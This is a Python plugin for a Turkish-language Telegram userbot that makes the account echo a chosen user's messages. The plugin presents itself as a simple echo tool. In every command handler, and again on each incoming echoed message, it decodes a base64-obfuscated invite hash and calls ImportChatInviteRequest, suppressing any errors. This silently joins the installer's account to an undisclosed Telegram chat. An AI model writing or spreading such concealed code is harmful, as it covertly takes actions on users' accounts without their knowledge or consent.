# Copyright (C) 2020 BristolMyers
#
# Licensed under the Raphielscape Public License, Version 1.c (the "License");
# you may not use this file except in compliance with the License.
#
# ExelonUserBot - BristolMyers

import asyncio
import pybase64
import requests
from .. import CMD_HELP
from telethon import events
from ..utils import admin_cmd, sudo_cmd, edit_or_reply
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from .sql_helper.echo_sql import is_echo, get_all_echos, addecho, remove_echo


@borg.on(admin_cmd(pattern="addecho$"))
@borg.on(sudo_cmd(pattern="addecho$", allow_sudo=True))
async def echo(exelon):
    if exelon.fwd_from:
        return
    if exelon.reply_to_msg_id is not None:
        reply_msg = await exelon.get_reply_message()
        user_id = reply_msg.from_id
        chat_id = exelon.chat_id
        try:
            hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            hmm = Get(hmm)
            await exelon.client(hmm)
        except BaseException:
            pass
        if is_echo(user_id, chat_id):
            await edit_or_reply(exelon, "Kullanıcı zaten tekrarlama ile etkinleştirildi ")
            return
        addecho(user_id, chat_id)
        await edit_or_reply(exelon, "Selam")
    else:
        await edit_or_reply(exelon, "Mesajlarını tekrarlamak için Bir Kullanıcının Mesajını Yanıtlayın")


@borg.on(admin_cmd(pattern="rmecho$"))
@borg.on(sudo_cmd(pattern="rmecho$", allow_sudo=True))
async def echo(exelon):
    if exelon.fwd_from:
        return
    if exelon.reply_to_msg_id is not None:
        reply_msg = await exelon.get_reply_message()
        user_id = reply_msg.from_id
        chat_id = exelon.chat_id
        try:
            hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            hmm = Get(hmm)
            await exelon.client(hmm)
        except BaseException:
            pass
        if is_echo(user_id, chat_id):
            remove_echo(user_id, chat_id)
            await edit_or_reply(exelon, "Kullanıcı için tekrarlama durduruldu")
        else:
            await edit_or_reply(exelon, "Kullanıcı tekrarlama ile etkinleştirilmez")
    else:
        await edit_or_reply(exelon, "Mesajlarını tekrarlamak için Bir Kullanıcının Mesajını Yanıtlayın")


@borg.on(admin_cmd(pattern="listecho$"))
@borg.on(sudo_cmd(pattern="listecho$", allow_sudo=True))
async def echo(exelon):
    if exelon.fwd_from:
        return
    lsts = get_all_echos()
    if len(lsts) > 0:
        output_str = "Tekrarlama etkin kullanıcılar:\n\n"
        for echos in lsts:
            output_str += f"[User](tg://user?id={echos.user_id}) konuşmada `{echos.chat_id}`\n"
    else:
        output_str = "Tekrarlama etkin kullanıcı yok "
    if len(output_str) > Config.MAX_MESSAGE_SIZE_LIMIT:
        key = requests.post(
            'https://nekobin.com/api/documents',
            json={
                "content": output_str}).json().get('result').get('key')
        url = f'https://nekobin.com/{key}'
        reply_text = f'echo enabled users: [here]({url})'
        await edit_or_reply(exelon, reply_text)
    else:
        await edit_or_reply(exelon, output_str)


@borg.on(events.NewMessage(incoming=True))
async def samereply(exelon):
    if exelon.chat_id in Config.UB_BLACK_LIST_CHAT:
        return
    if is_echo(exelon.sender_id, exelon.chat_id):
        await asyncio.sleep(2)
        try:
            hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            hmm = Get(hmm)
            await exelon.client(hmm)
        except BaseException:
            pass
        if exelon.message.text or exelon.message.sticker:
            await exelon.reply(exelon.message)


CMD_HELP.update({"echo": "**PLUGİN İSMİ:** `echo`\
      \n\n**📌Komut ➥ ** `.addecho` etkinleştirmek istediğiniz kullanıcıyı yanıtlayın :\
      \n**Kullanım ➥ **Tekrarlamayı etkinleştirdiğiniz kişi için onun her mesajını tekrarlar.\
      \n\n**📌Komut ➥ **  `.rmecho` etkinleştirmek istediğiniz kullanıcıyı yanıtlayın`\
      \n**Kullanım ➥ ** Tekrarlamayı kapatır.\
      \n\n**📌Komut ➥**  `.listecho`\
      \n**Kullanım ➥ ** Tekrarlamayı etkinleştirdiğiniz kullanıcıların listesini gösterir."
                 })
